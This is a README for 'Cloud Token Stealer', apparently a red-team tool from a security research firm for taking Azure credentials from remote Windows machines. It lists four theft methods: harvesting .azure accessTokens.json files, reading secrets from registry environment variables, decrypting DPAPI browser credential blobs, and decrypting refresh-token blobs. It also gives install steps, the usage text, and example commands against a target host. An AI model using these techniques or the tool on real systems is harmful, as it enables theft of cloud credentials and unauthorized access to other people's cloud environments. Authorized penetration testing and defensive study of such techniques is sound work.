# Cloud Token Stealer

A python tool to dump tokens and password allowing access to cloud services (Azure, AWS and GCP). <br>
Currently, only Azure is supported.

## Description

Cloud-token-stealer has one goal:

Dump tokens or passwords from remote computers, so we can connect to cloud environments

Cloud-token-stealer support four different methods of stealing tokens.

1. Scan for accessTokens.json files in the .azure directories generated by PowerShell az login 
2. Dump Azure secrets commonly saved in Environment Variables (Registry)
3. Decrypt encrypted Credentials blobs stored by Web browsers (DPAPI) for SSO
4. Decrypt Microsoft blobs that contains refreshToken for Azure assets


## Installation


Cloud-token-stealer is written in Python 3.7
All requirements are captured in the repo's requirements.txt.

```
git clone https://github.com/Cymptom-Research/azure-token-stealer.git 
cd cloud-token-stealer
pip install -r requirements.txt
```

## Usage

```
usage: cloud_stealer_tool.py [-h] -t TARGET -u username -p PASSWORD
                             [-d DOMAIN] [-e] [-D] [-f] [-a] [-debug]

Queries a specified computer and dump Azure credentials or tokens. 
Require administrative access to the machine

optional arguments:
  -h, --help            show this help message and exit
  -t TARGET, --target TARGET
                        target to query (IP or Hostname)
  -u username, --user username
                        username for authentication
  -p PASSWORD, --password PASSWORD
                        password for authentication
  -d DOMAIN, --domain DOMAIN
                        domain name
  -e, --env             search in environment variable
  -D, --dpapi           search in dpapi files
  -f, --file            search in .azure file
  -a, --all             search all methods
  -debug                Turn DEBUG output ON


```
### Examples

Dump all 
```
python3 cloud_stealer_tool.py --target adcon1.cymptom.com --user XXX --password XXX -d XXX
```

Dump only from DPAPI:
```
python3 cloud_stealer_tool.py --target adcon1.cymptom.com --user XXX --password XXX -d XXX -D 
```
